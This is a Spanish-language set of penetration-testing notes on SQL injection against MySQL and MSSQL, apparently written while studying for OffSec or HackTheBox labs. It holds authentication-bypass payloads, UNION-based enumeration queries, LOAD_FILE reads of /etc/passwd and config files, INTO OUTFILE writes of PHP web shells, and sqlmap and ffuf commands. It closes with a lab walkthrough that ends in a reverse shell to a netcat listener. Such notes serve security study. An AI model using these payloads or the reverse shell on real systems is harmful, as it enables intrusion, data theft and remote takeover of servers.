- [Lista de payloads interesantes](https://github.com/payloadbox/sql-injection-payload-list/blob/master/README.md)
- [Chuleta interesante - aparece todo lo visto en offsec](https://hackviser.com/tactics/pentesting/services/mysql)
En esta sección se centra en las bases de datos más comunes: MySQL y MSSQL
## Conexión
- Reportado en htb
## Consultas
### MySQL
- Versión de la base de datos
	```sql
	select version();
	-- También acepta
	select @@version
	```
- Usuario actual de la base de datos para la sesión en curso: 
	```sql
	select system_user();
	-- También puede ser válido
	select user();
	```
- Mostrar bases de datos
	```sql
	-- Desde terminal
	show databases;	
	-- Útil para inyección
	schema_name FROM information_schema.schemata
	-- Ejemplo con SQL Union based
	item=' union select null, , null, null, null FROM information_schema.schemata-- //' 
	```
- Mostrar tablas
	```sql
	show tables;
	-- útil para inyección - Todas las tablas
	table_name FROM information_schema.tables
	-- Tablas de una base de datos concreta
	table_name FROM information_schema.tables where table_schema='offsec'	
	```
- Mostrar columnas
	```sql
	SELECT column_name FROM information_schema.columns;
	-- de una tabla específica 
	SELECT column_name FROM information_schema.columns WHERE table_schema = 'nombre_base_datos' AND table_name = 'nombre_tabla';
	-- 
	```
- Contenido de las tablas
	```sql
	SELECT columna1, columna2 FROM nombre_tabla;
	-- Ejemplo de concatenación para mostrar varios valores en una sola línea:
	SELECT GROUP_CONCAT(columna1, ':', columna2) FROM nombre_tabla;
	```
#### Ejemplo subverting Query logic
Aquí aparece el ejemplo clásico de login con el siguiente backend, que es vulnerable porque concatena input sin parametrizar/sanetizar. 
```php
$conn = new mysqli("localhost", "root", "password", "users");
$username = $_POST['username'];
$password = $_POST['password'];

$sql = "SELECT * FROM logins WHERE username='$username' AND password='$password'";
$result = $conn->query($sql);

```
En un panel de login, bastaría con poner en el campo de usuario un valor como: 
- `' or 1=1-- -` para loguearse como el primer usuario de la base de datos
- 'admin -- -' para loguearse como admin
### MSSQL
- Obtener la versión
	```sql
	SELECT @@version;
	```
- Obtener el usuario actual que ejecuta la sesión:
	```sql
	SELECT SYSTEM_USER;
	-- Alternativa
	SELECT USER_NAME();
	```
- Listar bases de datos
	```
	SELECT name FROM master.dbo.sysdatabases;
	```
- Listar tablas
	```sql
	SELECT table_name FROM information_schema.tables;
	-- De una base de datos específica
	SELECT table_name FROM information_schema.tables WHERE table_catalog = 'nombre_base_datos';
	```
- Listar columnas
	```sql
	SELECT column_name FROM information_schema.columns;
	-- De una tabla específica
	SELECT column_name FROM information_schema.columns WHERE table_catalog = 'nombre_base_datos' AND table_name = 'nombre_tabla';
	```
- Extraer datos
	```sql
	SELECT columna1, columna2 FROM nombre_tabla;
	-- Ejemplo concatenación
	SELECT CONCAT(columna1, ':', columna2) FROM nombre_tabla;
	```

## Leyendo/escribiendo en archivos
### MySQL
Podemos comprobar si tenemos privilegios de lectura/escritura del siguiente modo. Para ello debemos tener el secure
```sql
SELECT variable_name, variable_value FROM information_schema.global_variables where variable_name="secure_file_priv"
```
### Leer archivos
Una vez hemos identificado la inyección podemos intentar leer archivos con `LOAD_FILE('/etc/passwd')`. Alguna información importante la podremos encontrar en muchas ocasiones bajo `/var/www/html/` + el archivo php que se esté sirviendo en la página si es php
```sql
' union select 'a', LOAD_FILE('/var/www/html/config.php') ,null, null -- - 
```
### Escribir en archivos

Al igual que con la lectura, podemos intentar escribir en archivos con el comando `SELECT .. INTO OUTFILE`. Ejemplo:
```sql
SELECT * from users INTO OUTFILE '/tmp/credentials';
```
En un escenario en el que podamos inyectar información podemos intentar lo siguiente (si funciona el archivo `http://$target/test.txt` estaría disponible):
```sql
' union select 'a', 'funciona' ,null, null into outfile '/var/www/html/test.txt'-- - 
```

#### Ejemplo de revshell
Podemos intentar algo como lo que sigue:
```sql
' union select 'a', '<?php system($_REQUEST[cmd]); ?>' ,null, null into outfile '/var/www/html/shell.php'-- - 
```

## Concatenar con otras vulnerabilidades
### XSS
Podemos probar ideas como la que sigue:
```sql
' union select 'a', "<script> alert(1)</script>,null, null -- - 
```
si se acontece una SQLi. En este caso, dado que la consulta se hace por GET, tendríamos un XSS reflected
### PHP
```
' union select 'a',"<?php echo shell_exec($_GET['cmd']);?>" ,null, null -- - 
' union select 'a',"<?php shell_exec($_GET['cmd']);?>" ,null, null -- - 
```

## Autenticación por fuerza bruta 
- En un panel de autenticación, podemos tomar una lista de payloads ([ejemplo](https://github.com/payloadbox/sql-injection-payload-list/blob/master/Intruder/exploit/Auth_Bypass.txt)) y ejecutar ffuf sobre el panel de autenticación: 
	```bash
	ffuf -w Auth_Bypass.txt:FUZZ -d 'uid=FUZZ&password=asfd' -b $'PHPSESSID=564306570db3003d8bafcee9b1a00882' -H 'Content-Type: application/x-www-form-urlencoded' -u http://$target -x http://127.0.0.1:8080 -fr "Invalid|Error"
	```

### Ejemplo sqlmap
Sabemos que hay un parámetro `user` que es vulnerable a sqli basada en tiempo, por lo que hacemos lo siguiente: 
```bash
--sqlmap -u "http://$target/blindsqli.php?user=1" -p user --dbms=mysql --time-sec=5 --current-db -D offsec -T users -C id,description --dump
```
- `-p user` especifica que el parámetro vulnerable es user
- `--dbms=mysql`: Especifica el tipo de base de datos.
- `--time-sec=5`: Define el retraso para detección de inyección basada en tiempo.
- `-D offsec`: Selecciona la base de datos `offsec`.
- `-T users`: Selecciona la tabla `users`.
- `-C id,description`: Selecciona las columnas `id` y `description`.
- `--dump`: Extrae y muestra el contenido.
Se hubiera podido añadir una flag adicional si quiero volcar la información del usuario cuyo `id=2` , añadiendo la flag `where="id=2"`
### Ejemplo ejercicio mysql - Union Select
- Nos encontramos un campo de búsqueda `mail-list` vulnerable en  una petición POST, comprobando que  tiene un carácter de escape `'` . El siguiente ejemplo genera un error
	```sql
	mail-list=fuzz' hola -- -'
	```
- Comprobamos que es vulnerable a un ataque de `union select`. Aunque no produzca errores una consulta como la siguiente: 
	```sql
	mail-list=fuzz' order by 100 -- -'
	```
	Seguimos probando alternativas hasta encontrar que podemos mostrar datos con el siguiente payload
	```sql
	mail-list=fuzz' UNION SELECT NULL,NULL,NULL,NULL,version(),NULL -- -#'
	```
- A partir de aquí mostramos bases de datos con : 
	```sql
	mail-list=fuzz' UNION SELECT NULL,NULL,NULL,NULL,schema_name,NULL FROM information_schema.schemata-- -#'
	```
	Encontrando la base de datos `animal_planet`
- Mostramos las tablas de esta base de datos del siguiente modo: 
	```sql
	mail-list=fuzz' UNION SELECT NULL,NULL,NULL,NULL,table_name,NULL FROM information_schema.tables where table_schema="animal_planet"-- -#'
	```
	Encontrando la tabla `subscribers`
- A continuación mostramos las columnas: 
	```sql
	mail-list=fuzz' UNION SELECT NULL,NULL,NULL,NULL,column_name,NULL FROM information_schema.columns where table_schema="animal_planet"-- -#'
	```
	Encontrando los campos `id,emails,is_donor,donor_type,status,created_at`
- Mostramos toda la información de esos campos: 
	```sql
	mail-list=fuzz' UNION SELECT NULL,NULL,NULL,NULL,group_concat(id,':',emails,':',is_donor,':',donor_type,':',status,':',created_at),NULL FROM subscribers-- -#'
	```
	Sin encontrar información relevante

- Probamos otra estrategia, comprobando que podemos leer información del sistema del siguiente modo: 
	```sql
	mail-list=fuzz' UNION SELECT NULL,NULL,NULL,NULL,LOAD_FILE('/etc/passwd'),NULL -- -#'
	```
	Lo cual nos permite comprobar que podemos leer información sensible del sistema.
- Intentamos ver si podemos escribir archivos en el sistema, intentando comprobar si tenemos RCE escribiendo en el directorio `/var/www/html/` un archivo llamado `shell.php`
	```sql
	mail-list=fuzz' UNION SELECT NULL,NULL,NULL,NULL,"<?php echo shell_exec($_GET['cmd']);?>",NULL INTO OUTFILE '/var/www/html/shell.php'-- -#'
	```
- Comprobamos que tenemos RCE con 
	```bash
	curl http://$target/shell.php?cmd=whoami
	```
- Nos envíamos una revshell mientras nos ponemos en escucha en el puerto `4444`
	```bash
	curl http://$target/shell.php?cmd=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7Cbash%20-i%202%3E%261%7Cnc%20192.168.45.244%204444%20%3E%2Ftmp%2Ff
	```
	Encontrando la flag


